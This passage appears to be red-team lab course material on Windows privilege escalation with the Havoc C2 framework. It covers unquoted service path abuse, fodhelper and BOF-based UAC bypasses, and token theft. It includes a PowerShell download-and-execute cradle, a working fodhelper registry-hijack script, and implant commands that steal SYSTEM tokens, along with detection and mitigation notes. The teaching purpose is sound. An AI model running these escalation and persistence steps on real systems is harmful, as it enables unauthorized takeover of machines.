<pre><code class="language-powershell">powershell &quot;IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')&quot;
</code></pre>
<p>Use the Havoc session to upload a havoc.exe renamed to <code>vulnerable.exe</code> to the <code>C:\MyPrograms\Vulnerable Service\</code> path, and then start the VulnService, using the havoc <code>shell</code> command.</p>
<p>upload /opt/havoc/demonsvc.x64.exe c:\MyPrograms\Vulnerable.exe</p>
<pre><code class="language-powershell">sc.exe start VulnService
</code></pre>
<blockquote>
<p>Please note that regular users can't restart services, but after a reboot this will automatically execute.</p>
</blockquote>
<p>You'll now have a 2nd beacon with <code>NT AUHORITY\SYSTEM</code> privileges.</p>
<blockquote>
<p><em><strong>IMPORTANT</strong></em>: We achieve not only <code>Privilege Escalation</code>, but also <code>code-execution</code> and <code>persistence</code>!!!</p>
</blockquote>
<h1><a class="header" href="#lab---privesc" id="lab---privesc">Lab - PrivEsc</a></h1>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<blockquote>
<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
<strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
</blockquote>
<blockquote>
<p>IMPORTANT : Make sure Windows Defender is turned OFF!!!</p>
</blockquote>
<p>First of all, we need to find if there are any misconfigurations on the Windows victime - we can use several tools.</p>
<ul>
<li>WinPeas</li>
<li>SharpUp</li>
<li>PowerUp </li>
</ul>
<p>In our Havoc client let's generate a new payload, but this time a windows service that we can drop in the directory of the vulnerable service:</p>
<p><img src="./images/labpriv_servicepayload.jpg" alt="Screenshot" /></p>
<pre><code>dotnet inline-execute /opt/havoc/tools/SharpUp.exe audit UnquotedServicePath
</code></pre>
<p><img src="./images/labpriv_sharpup.jpg" alt="Screenshot" /></p>
<p>We now know there's a service that we can abuse for executing a payload, but does it also run with higher privileges as the current user? Remember we want to escalate our privileges. Let's find out.</p>
<p>We can do this with some simple native windows commands, first check which account this service runs with.</p>
<pre><code class="language-powershell">sc query vulnservice
</code></pre>
<p><img src="./images/labpriv_cmdsc.jpg" alt="Screenshot" /></p>
<p>Then let's see which privileges this <code>Threatadmin</code> user has (i.e. member of the Administrators group).</p>
<pre><code class="language-powershell">net localgroup &quot;Administrators&quot; | find &quot;Threatadmin&quot;
</code></pre>
<p><img src="./images/labpriv_cmdnet.jpg" alt="Screenshot" /></p>
<p>In Havoc we can use these commands as well by using the <code>SHELL</code> command - this executes cmd.exe commands and gets the output:</p>
<p><img src="./images/labpriv_sc.jpg" alt="Screenshot" /></p>
<p>and</p>
<p><img src="./images/labpriv_localgroup.jpg" alt="Screenshot" /></p>
<p>However, HAVOC has plenty of build-in commands we can use and that are more opsec safe, these commands typically use BOF's (Beacon Object Files).</p>
<blockquote>
<p><em><strong>DEFINITION</strong></em>: </p>
<p>A BOF is a <code>position-independent code</code> file, typically in the Common Object File Format (COFF), generated by a <em><strong>C</strong></em> compiler. It is not a standalone executable but rather a lightweight module that runs <code>within the memory</code> space of a Beacon process. BOFs allow developers to add new post-exploitation features or capabilities to the Beacon agent without requiring a separate process creation or injection, which can be noisy and detectable by security tools.</p>
</blockquote>
<blockquote>
<p><em><strong>ADVANTAGES</strong></em>:</p>
<ul>
<li>BOFs have a minimal footprint (often less than 3KB, compared to larger files like Reflective DLLs or .NET assemblies), making them harder to detect by antivirus (AV) or endpoint detection and response (EDR) systems.</li>
<li>They run in-memory within the Beacon process, avoiding disk writes or process creation, which reduces their visibility. They use internal Beacon APIs and limited Windows APIs. This in-process execution contrasts with traditional methods like fork-and-run, which create new processes and are more likely to trigger security alerts.</li>
</ul>
</blockquote>
<blockquote>
<p><em><strong>LIMITATIONS</strong></em></p>
<ul>
<li>BOFs are <em>not</em> suited for <code>large or long-running tasks</code>. They lack support for complex linking (e.g., no .bss section for global variables) and are best for quick, one-off commands.</li>
</ul>
</blockquote>
<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm</a></p>
<p>We can use BOF's for enumerating the vulnerable service, just like we did before, and finding out if the service account is privieleged or not:</p>
<p><img src="./images/labpriv_sc_qc.jpg" alt="Screenshot" /></p>
<p><img src="./images/labpriv_netuser.jpg" alt="Screenshot" /></p>
<p>So now we know we have a service on the system that has an unquoted service path, the directory is writeable by regular users (in real scenarios the c:\users\username\appdata folder is a common location that unprivileged users have full access to), and the acoount being used is privileged.</p>
<p>Let's see what happens if we drop our havoc service payload (havoc.x64svc.exe) in the &quot;c:\Myprograms&quot; directory, and rename it to Vulnerable.exe.</p>
<p>We can do this with HAVOC:</p>
<p><img src="./images/labpriv_upload.jpg" alt="Screenshot" /></p>
<p>If we have a look on our windows machine we can see the malicious service executable was dropped in the &quot;C:\MyPrograms&quot; folder. Now whenever this services (re-)starts, it will execute our havoc payload instead of the actual service. </p>
<p>Instead of rebooting our Windows machine, let's just start the service manually (this requires admin privileges)and see what happens, open a command prompt:</p>
<pre><code class="language-powershell">sc start vulnservice
</code></pre>
<p><img src="./images/labpriv_admindemon.jpg" alt="Screenshot" /></p>
<p>We can see a new demon spawned, under the Threatadmin account, let's check our privileges by interacting with out new session, using the command <code>whoami</code>:</p>
<pre><code>whoami
</code></pre>
<p>We can now see that we are running a new demon, with an admin account and our process is running in <code>HIGH</code> integrity (services that run with privileged acounts always run in high integrity by the way).</p>
<h1><a class="header" href="#uac---user-account-control-privilege-escalation" id="uac---user-account-control-privilege-escalation">UAC - User Account Control (Privilege Escalation)</a></h1>
<h1><a class="header" href="#summary-1" id="summary-1">SUMMARY</a></h1>
<p>Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.</p>
<p>If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.</p>
<p>Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild.</p>
<h1><a class="header" href="#mitre-1" id="mitre-1">MITRE</a></h1>
<p><img src="./images/uac_mitre.jpg" alt="Screenshot" /></p>
<blockquote>
<p><em><strong>TL;DR</strong></em>:
User Account Control (UAC) is a security feature in Windows that helps prevent unauthorized changes to your computer. These changes can be initiated by applications, viruses, or other forms of malware. UAC ensures that such changes cannot be made without your knowledge or consent, adding an extra layer of security.</p>
<p>UAC splits the Administrative user’s token into a medium and a high integrity token. When that user tries to run something as an administrator, a prompt is shown which they must accept, which then the high integrity token is then applied to that process or thread.</p>
<p>A <em><strong>UAC bypass</strong></em> is going from the Administrative user’s <code>medium</code> integrity token to <code>high</code> integrity token without having to interact with the prompt.</p>
</blockquote>
<p><img src="./images/uac_prompt.jpg" alt="image" /></p>
<h1><a class="header" href="#process-and-integrity-levels" id="process-and-integrity-levels">Process and integrity levels</a></h1>
<p>screenshot admin user medium integrity</p>
<blockquote>
<p><em><strong>IMPORTANT</strong></em>: <code>UAC Bypasses</code> only work for users that are in the administrator group on the local machine.</p>
</blockquote>
<p><img src="./images/uac_adminprivs.jpg" alt="image" /></p>
<h2><a class="header" href="#how-uac-works" id="how-uac-works">How UAC Works</a></h2>
<ol>
<li>
<p><strong>Permissions and Elevation</strong>
When you or an application tries to make changes that require administrative privileges, UAC prompts you to confirm or deny the action. This is known as elevation. Only an administrator account can provide the necessary permission to proceed.</p>
</li>
<li>
<p><strong>Secure Desktop</strong>
In higher UAC settings, the prompt appears on the secure desktop. This is a screen dimming feature that makes it difficult for malware to interact with or spoof the UAC prompt. Essentially, it ensures that the prompt is coming from Windows and not from a malicious program.</p>
</li>
<li>
<p><strong>Levels of Notification</strong>
UAC has different levels of notification settings, ranging from always notifying you of changes to never notifying you (effectively turning off UAC).</p>
</li>
</ol>
<h2><a class="header" href="#user-account-control-uac-has-four-levels-of-notification-settings" id="user-account-control-uac-has-four-levels-of-notification-settings">User Account Control (UAC) has four levels of notification settings:</a></h2>
<ol>
<li>
<p><strong>Always notify</strong>: This is the highest level of protection. It notifies you before any changes are made to your computer that require administrator permissions. It also freezes other tasks until you respond.</p>
</li>
<li>
<p><strong>Notify me only when programs try to make changes to my computer</strong>: This is the <code>DEFAULT</code> level. It notifies you when programs try to make changes to your computer or install software.</p>
</li>
<li>
<p><strong>Notify me only when programs try to make changes to my computer (do not dim my desktop)</strong>: Similar to the previous level, but it doesn't switch to the Secure Desktop with desktop locking.</p>
</li>
<li>
<p><strong>Never notify</strong>: This is the lowest level of protection. UAC is disabled, and you won't be notified when changes are made to your computer.</p>
</li>
</ol>
<p>You can adjust these settings by moving the slider in the User Account Control Settings window.</p>
<p><img src="./images/uac_settings.jpg" alt="image" /></p>
<p>Running a simple powershell command that add's a registry key with some values shows nicely what this actually means:</p>
<p><img src="./images/uac_ps.jpg" alt="image" /> </p>
<p><img src="./images/uac_prompt.jpg" alt="image" /></p>
<p>Check if UAC is enabled (1 = enabled, 0 is disabled)</p>
<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object EnableLua
</code></pre>
<p>And to check which level it is :</p>
<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object ConsentPromptBehaviorAdmin
</code></pre>
<table><thead><tr><th>Value</th><th>Description</th></tr></thead><tbody>
<tr><td>0</td><td>No Prompt</td></tr>
<tr><td>1</td><td>Prompt for credential on the secure desktop</td></tr>
<tr><td>2</td><td>Prompt for CONSENT on the secure desktop</td></tr>
<tr><td>3</td><td>Prompt for Credentials on the normal desktop</td></tr>
<tr><td>4</td><td>Prompt for CONSENT on the normal desktop</td></tr>
<tr><td>5</td><td>Prompt for CONSENT for non-windows binaries</td></tr>
</tbody></table>
<p>https://www.youtube.com/watch?v=ZhaZJ4Uipqk</p>
<p>Fodhelper</p>
<p>Demo with cmd.exe -&gt; medium level even if admin
runas 
show whoami / groups
show system informer</p>
<p>start beacon as unprivileged user</p>
<p>whoami groups</p>
<pre><code class="language-bash">sudo apt install mingw-w64 -y

git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
make
</code></pre>
<p>In Havoc -&gt; Script Manager Load .py</p>
<p>Set Sleep to 10</p>
<pre><code class="language-code">uac-bypass sspidatagram c:\windows\system32\cmd.exe
uac-bypass sspidatagram c:\temp\demon.x64.exe -&gt; NT Authority\System
uac-bypass silentcleanup /opt/havoc/payloads/demon.x64.exe -&gt; error
</code></pre>
<hr />
<p>Priv Esc.</p>
<pre><code class="language-powershell">powershell &quot;IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')&quot;
</code></pre>
<hr />
<p>UAC Bypass (admin user -&gt; high integrity) -&gt; PrivsFU -&gt; NT AUTH</p>
<hr />
<p>Example using a vulnerable service running as administrator but not in highest privileges</p>
<p>User student_adm (integrity medium)</p>
<pre><code>import-module .\FodhelperBypass.ps1
PS C:\Temp&gt;  FodhelperBypass -program &quot;cmd.exe&quot;
</code></pre>
<hr />
<h1><a class="header" href="#fodhelper-uac-bypass" id="fodhelper-uac-bypass">FODHELPER UAC BYPASS</a></h1>
<h1><a class="header" href="#fodhelper-uac-bypass-explanation" id="fodhelper-uac-bypass-explanation">Fodhelper UAC Bypass Explanation</a></h1>
<p>The <strong>Fodhelper UAC bypass</strong> is a technique used to escalate privileges on Windows systems by exploiting the <code>fodhelper.exe</code> executable, a trusted Microsoft binary. This method allows attackers or testers to bypass <strong>User Account Control (UAC)</strong> prompts, enabling the execution of commands with elevated (high-integrity) privileges without user interaction. Below is a detailed explanation of how it works, its requirements, and mitigation strategies, formatted in Markdown.</p>
<h2><a class="header" href="#table-of-contents" id="table-of-contents">Table of Contents</a></h2>
<ul>
<li><a href="uac.html#uac---user-account-control-privilege-escalation">UAC - User Account Control (Privilege Escalation)</a></li>
<li><a href="uac.html#summary">SUMMARY</a></li>
<li><a href="uac.html#mitre">MITRE</a></li>
<li><a href="uac.html#process-and-integrity-levels">Process and integrity levels</a>
<ul>
<li><a href="uac.html#how-uac-works">How UAC Works</a></li>
<li><a href="uac.html#user-account-control-uac-has-four-levels-of-notification-settings">User Account Control (UAC) has four levels of notification settings:</a></li>
</ul>
</li>
<li><a href="uac.html#fodhelper-uac-bypass">FODHELPER UAC BYPASS</a></li>
<li><a href="uac.html#fodhelper-uac-bypass-explanation">Fodhelper UAC Bypass Explanation</a>
<ul>
<li><a href="uac.html#table-of-contents">Table of Contents</a></li>
<li><a href="uac.html#what-is-fodhelper">What is Fodhelper?</a></li>
<li><a href="uac.html#what-is-uac">What is UAC?</a></li>
<li><a href="uac.html#how-the-fodhelper-uac-bypass-works">How the Fodhelper UAC Bypass Works</a></li>
<li><a href="uac.html#requirements-for-the-bypass">Requirements for the Bypass</a></li>
<li><a href="uac.html#step-by-step-exploitation">Step-by-Step Exploitation</a></li>
<li><a href="uac.html#example-code">Example Code</a></li>
<li><a href="uac.html#detection-and-mitigation">Detection and Mitigation</a>
<ul>
<li><a href="uac.html#detection">Detection</a></li>
<li><a href="uac.html#mitigation">Mitigation</a></li>
</ul>
</li>
<li><a href="uac.html#limitations-and-risks">Limitations and Risks</a></li>
<li><a href="uac.html#references">References</a></li>
</ul>
</li>
</ul>
<h2><a class="header" href="#what-is-fodhelper" id="what-is-fodhelper">What is Fodhelper?</a></h2>
<p><code>Fodhelper.exe</code> is a legitimate Windows executable located in <code>C:\Windows\System32\fodhelper.exe</code>. Introduced in Windows 10, it is used to manage optional features, such as region-specific keyboard settings or language changes, accessible via the &quot;Manage Optional Features&quot; option in Windows Settings. Key characteristics include:</p>
<ul>
<li><strong>Signed by Microsoft</strong>: Ensures authenticity and trust.</li>
<li><strong>Auto-elevate Privilege</strong>: Runs with a <strong>high-integrity level</strong> due to its <code>autoElevate</code> flag set to <code>true</code> in its manifest, meaning it can execute with elevated privileges without triggering a UAC prompt under most UAC settings.<a href="https://foldsab.github.io/posts/UAC_bypass_using_fodhelper/"></a></li>
</ul>
<h2><a class="header" href="#what-is-uac" id="what-is-uac">What is UAC?</a></h2>
<p><strong>User Account Control (UAC)</strong> is a Windows security feature that prevents unauthorized changes to the operating system by requiring user approval for actions needing administrative privileges. When a process requests elevation, UAC displays a prompt asking for consent or credentials. The fodhelper bypass exploits a trusted binary to avoid this prompt.</p>
<h2><a class="header" href="#how-the-fodhelper-uac-bypass-works" id="how-the-fodhelper-uac-bypass-works">How the Fodhelper UAC Bypass Works</a></h2>
<p>The bypass leverages the way <code>fodhelper.exe</code> interacts with the Windows Registry, specifically the <code>HKEY_CURRENT_USER (HKCU)</code> hive, which is writable by the current user without administrative privileges. Here's the core mechanism:</p>
<ol>
<li>
<p><strong>Registry Key Manipulation</strong>: </p>
<ul>
<li>When <code>fodhelper.exe</code> runs, it queries the registry key <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code> to check for a command to execute.</li>
<li>This key does not exist by default, and the current user has permission to create and modify it.</li>
<li>An attacker can create this key and insert a custom command (e.g., launching <code>cmd.exe</code> or a malicious script).</li>
</ul>
</li>
<li>
<p><strong>Auto-elevation</strong>:</p>
<ul>
<li>Since <code>fodhelper.exe</code> is a trusted binary with the <code>autoElevate</code> flag, it runs with high integrity automatically.</li>
<li>When it reads the manipulated registry key, it executes the attacker's command in a high-integrity context, bypassing the UAC prompt.</li>
</ul>
</li>
<li>
<p><strong>Execution Flow Hijacking</strong>:</p>
<ul>
<li>The technique hijacks the normal execution flow of <code>fodhelper.exe</code> by redirecting it to execute a user-specified command, inheriting the elevated privileges.<a href="https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies"></a></li>
</ul>
</li>
</ol>
<p>This method was first documented in 2017 and has been used by malware like Trickbot and in penetration testing scenarios.<a href="https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/"></a><a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/"></a></p>
<h2><a class="header" href="#requirements-for-the-bypass" id="requirements-for-the-bypass">Requirements for the Bypass</a></h2>
<ul>
<li><strong>Operating System</strong>: Windows 10 (build 1709 or higher; some sources indicate earlier builds like 10240 are also vulnerable).<a href="https://shuciran.github.io/posts/%28UAC%29-Bypass-fodhelper.exe/"></a><a href="https://rootm0s.github.io/fodhelper-uac-bypass/"></a></li>
<li><strong>User Privileges</strong>: The user must be part of the <strong>Administrators group</strong>. The bypass does not work for standard users.<a href="https://www.fortinet.com/blog/threat-research/offense-and-defense-a-tale-of-two-sides-bypass-uac"></a></li>
<li><strong>UAC Settings</strong>: The bypass works with most UAC settings except when UAC is set to &quot;Always Notify&quot; (highest level), where a prompt is still required.<a href="https://www.exploit-db.com/exploits/42142"></a></li>
<li><strong>Registry Access</strong>: The attacker needs write access to the <code>HKCU</code> hive, which is typically available to any logged-in user.</li>
</ul>
<h2><a class="header" href="#step-by-step-exploitation" id="step-by-step-exploitation">Step-by-Step Exploitation</a></h2>
<ol>
<li>
<p><strong>Create Registry Structure</strong>:</p>
<ul>
<li>Create the registry key: <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>.</li>
<li>Add a string value named <code>(Default)</code> with the desired command (e.g., <code>cmd.exe /c powershell.exe</code>).</li>
<li>Add an empty string value named <code>DelegateExecute</code> to ensure <code>fodhelper.exe</code> executes the command in the <code>(Default)</code> value.<a href="https://9emin1.github.io/progress/work/2021/07/25/fodhelper.html"></a></li>
</ul>
</li>
<li>
<p><strong>Execute Fodhelper</strong>:</p>
<ul>
<li>Run <code>fodhelper.exe</code> (e.g., via <code>C:\Windows\System32\fodhelper.exe</code>).</li>
<li>The executable reads the manipulated registry key and executes the specified command with high integrity.</li>
</ul>
</li>
<li>
<p><strong>Cleanup (Optional)</strong>:</p>
<ul>
<li>Delete or restore the registry key to avoid detection or conflicts (e.g., <code>Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Force</code>).<a href="https://cheats.philkeeble.com/windows/uac-bypasses"></a></li>
</ul>
</li>
</ol>
<h2><a class="header" href="#example-code" id="example-code">Example Code</a></h2>
<p>Below is a PowerShell script to perform the fodhelper UAC bypass, based on publicly available proofs of concept. <strong>Warning</strong>: Do not run this on production systems, as it modifies the registry and can trigger antivirus detection.<a href="https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1"></a></p>
<pre><code class="language-powershell"># Fodhelper UAC Bypass Script
function FodhelperBypass {
    param (
        [String]$program = &quot;cmd.exe /c powershell.exe&quot; # Default command
    )

    # Create registry structure
    New-Item -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force
    New-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(Default)&quot; -Value $program -Force
    New-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -PropertyType String -Force

    # Execute fodhelper.exe
    Start-Process -FilePath &quot;C:\Windows\System32\fodhelper.exe&quot; -WindowStyle Hidden

    # Cleanup (wait and remove registry keys)
    Start-Sleep -Seconds 3
    Remove-Item -Path &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Force
}

# Example usage
FodhelperBypass -program &quot;cmd.exe /c start powershell.exe&quot;
</code></pre>
<p>A simpler two-line command-line version, as shared on X, is:</p>
<pre><code class="language-cmd">REG ADD HKCU\Software\Classes\ms-settings\shell\open\command /ve /d &quot;cmd.exe&quot; /f
REG ADD HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
</code></pre>
<h2><a class="header" href="#detection-and-mitigation" id="detection-and-mitigation">Detection and Mitigation</a></h2>
<h3><a class="header" href="#detection" id="detection">Detection</a></h3>
<ul>
<li><strong>Monitor Registry Changes</strong>:
<ul>
<li>Look for creation or modification of <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code> using tools like Sysmon or EDR solutions.<a href="https://research.splunk.com/endpoint/909f8fd8-7ac8-11eb-a1f3-acde48001122/"></a></li>
</ul>
</li>
<li><strong>Process Monitoring</strong>:
<ul>
<li>Detect <code>fodhelper.exe</code> spawning unexpected child processes (e.g., <code>cmd.exe</code>, <code>powershell.exe</code>) via EDR telemetry.<a href="https://help.fortinet.com/fsiem/Public_Resource_Access/7_1_1/rules/PH_RULE_Bypass_UAC_via_Fodhelper_exe.htm"></a></li>
</ul>
</li>
<li><strong>Windows Defender Alerts</strong>:
<ul>
<li>Windows Defender may flag this activity, though renaming executables (e.g., copying <code>cmd.exe</code> to a different name) can evade detection.<a href="https://foldsab.github.io/posts/UAC_bypass_using_fodhelper/"></a></li>
</ul>
</li>
<li><strong>Token Attributes</strong>:
<ul>
<li>Check for processes with <code>LUA://HdAutoAp</code> or <code>LUA://DecHdAutoAp</code> attributes, indicating auto-elevated applications or their descendants.<a href="https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies"></a></li>
</ul>
</li>
</ul>
<h3><a class="header" href="#mitigation" id="mitigation">Mitigation</a></h3>
<ul>
<li><strong>Set UAC to &quot;Always Notify&quot;</strong>:
<ul>
<li>Configure UAC to the highest level to force prompts for all elevation requests, though this may impact user experience.<a href="https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/"></a></li>
</ul>
</li>
<li><strong>Endpoint Security</strong>:
<ul>
<li>Use EDR solutions with custom rules to detect registry manipulation or suspicious <code>fodhelper.exe</code> activity.<a href="https://research.splunk.com/endpoint/909f8fd8-7ac8-11eb-a1f3-acde48001122/"></a></li>
</ul>
</li>
<li><strong>Least Privilege</strong>:
<ul>
<li>Avoid running as an Administrator group member; use standard user accounts for daily tasks.<a href="https://www.fortinet.com/blog/threat-research/offense-and-defense-a-tale-of-two-sides-bypass-uac"></a></li>
</ul>
</li>
<li><strong>Patch and Update</strong>:
<ul>
<li>While Microsoft has not fully patched this bypass (as of 2025), keeping systems updated reduces the attack surface.<a href="https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/"></a></li>
</ul>
</li>
<li><strong>Registry Hardening</strong>:
<ul>
<li>Restrict write access to <code>HKCU\Software\Classes</code> for non-admin users, though this may break legitimate functionality.</li>
</ul>
</li>
</ul>
<h2><a class="header" href="#limitations-and-risks" id="limitations-and-risks">Limitations and Risks</a></h2>
<ul>
<li><strong>Limited to Administrators</strong>: Only works for users in the Administrators group, not standard users.<a href="https://www.fortinet.com/blog/threat-research/offense-and-defense-a-tale-of-two-sides-bypass-uac"></a></li>
<li><strong>Antivirus Detection</strong>: Windows Defender and other AV solutions may detect and block the bypass, especially if not obfuscated. Renaming executables can mitigate this.<a href="https://9emin1.github.io/progress/work/2021/07/25/fodhelper.html"></a><a href="https://foldsab.github.io/posts/UAC_bypass_using_fodhelper/"></a></li>
<li><strong>System Impact</strong>: Modifying the registry can cause unintended behavior if not cleaned up properly.<a href="https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/"></a></li>
<li><strong>Not a Full Privilege Escalation</strong>: This is a UAC bypass, not a true local privilege escalation (e.g., from standard user to admin).<a href="https://www.fortinet.com/blog/threat-research/offense-and-defense-a-tale-of-two-sides-bypass-uac"></a></li>
<li><strong>Ethical Use</strong>: This technique should only be used in authorized penetration testing or research environments. Unauthorized use is illegal and unethical.</li>
</ul>
<h2><a class="header" href="#references" id="references">References</a></h2>
<ul>
<li>TCM Security: Bypassing Defender with Fodhelper<a href="https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/"></a></li>
<li>Pentestlab: UAC Bypass – Fodhelper<a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/"></a></li>
<li>Medium: By Pass UAC Using Fodhelper<a href="https://nadimsaliby.medium.com/by-pass-uac-using-fodhelper-e4a94e04d5f0"></a></li>
<li>Elastic Security Labs: Exploring Windows UAC Bypasses<a href="https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies"></a></li>
<li>Splunk: Detection of Fodhelper UAC Bypass<a href="https://research.splunk.com/endpoint/909f8fd8-7ac8-11eb-a1f3-acde48001122/"></a></li>
<li>GitHub: FodhelperBypass.ps1 by winscripting<a href="https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1"></a></li>
<li>X Post by @xxByte (2021)</li>
</ul>
<hr />
<p>This explanation provides a comprehensive overview of the fodhelper UAC bypass, including its mechanics, implementation, and countermeasures. Always use such techniques responsibly and within legal boundaries.</p>
<hr />
<p>Now user in in High Interity - running TokenPlayer (whicj enables sedebugprivilege) will now escalate to system!</p>
<p>In havoc, running admin user in high integrity, you still need to set sedebugprivilege in order to use <code>STEAL TOKEN</code>:</p>
<pre><code>04/04/2025 14:05:18 [Threatadmin] Demon » token privs-get SeDebugPrivilege
[*] [F6CB1E4A] Tasked demon to enable a privilege: SeDebugPrivilege
[+] Send Task to Agent [41 bytes]
[+] The privilege SeDebugPrivilege was successfully enabled

04/04/2025 14:05:31 [Threatadmin] Demon » token steal 4536
[*] [20765EC8] Tasked demon to steal a process token
[+] Send Task to Agent [24 bytes]
[+] Successful stole and impersonated token from 4536 User:[NT AUTHORITY\SYSTEM] TokenID:[0]
</code></pre>
<h1><a class="header" href="#lab---uac-bypass" id="lab---uac-bypass">Lab - UAC Bypass</a></h1>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<blockquote>
<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
<strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
</blockquote>
<blockquote>
<p><em><strong>IMPORTANT</strong></em>: For this lab we will <em><strong><r>TURN OFF Windows Defender</r></strong></em>. We will deal with AV evasion techniques later, for now let's focus on making sure we can escalate to the highest level of privileges (<em><strong>NT AUTHORITY\SYSTEM</strong></em>).</p>
</blockquote>
<p>On kali :</p>
<pre><code class="language-bash">cd /opt/havoc
mkdir modules
cd modules
https://github.com/icyguider/UAC-BOF-Bonanza.git
cd UAC-BOF-Bonanza
make
</code></pre>
<p>First let's now load or new UAC Bypass Module in havoc by clicking on <code>SCRIPT MANAGER</code> and locating the <code>Havoc-UACBypass,py</code> file.</p>
<p>On your windows machine, open a command prompt</p>
<pre><code class="language-powershell">cd c:\temp\
demo.x64.exe
</code></pre>
<p><img src="./images/labuac_havocscript.jpg" alt="Screenshot" /></p>
<p>We have a beacon running in as user Threatadmin in HIGH intergity - but not as SYSTEM yet (don't worry this also works from medium integrity). We can run the <code>whoami</code> command to confirm this.</p>
<p><img src="./images/labuac_havocwhoamithreat.jpg" alt="screenshot" /></p>
<p>We can see here that the demon implant is running with</p>
<ul>
<li>user Threatadmin</li>
<li>Part of the local administrators group</li>
<li>in High integrity level</li>
</ul>
<p>Now in the Havoc UI let's interact with this beacon and run our UAC-Bypass.</p>
<p><img src="./images/labuac_havocinteract.jpg" alt="Screenshot" /></p>
<pre><code class="language-powershell">uac-bypass sspidatagram c:\temp\demon.x64.exe
</code></pre>
<p><img src="./images/labuac_havocuacsystem.jpg" alt="Screenshot" /></p>
<p>A new demon implant will spawn, but now running with SYSTEM privileges as you can verify this by interacting with this new session and running the <code>whoami</code> command again.</p>
<p><img src="./images/labuac_havocwhoami.jpg" alt="Screenshot" /></p>
<p>When opening systeminformer we can see the 2 demon implants (verify the process ID's)</p>
<p><img src="./images/labuac_si2.jpg" alt="Screenshot" /></p>
<p>To do the same attack but from an admin user running with <code>MEDIUM</code> integrity, just open a command prompt and type:</p>
<pre><code class="language-powershell">runas /user:student_adm cmd.exe
</code></pre>
<p>This will run a command prompt as administrator (student_adm is part of the admininistrator group)</p>
<h1><a class="header" href="#stealing-tokens" id="stealing-tokens">STEALING TOKENS</a></h1>
<p><a href="https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b">https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b</a>
<a href="https://gist.github.com/vector-sec/a049bf12da619d9af8f9c7dbd28d3b56">https://gist.github.com/vector-sec/a049bf12da619d9af8f9c7dbd28d3b56</a></p>
<hr />
<h1><a class="header" href="#summary-2" id="summary-2">SUMMARY</a></h1>
<p>Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.</p>
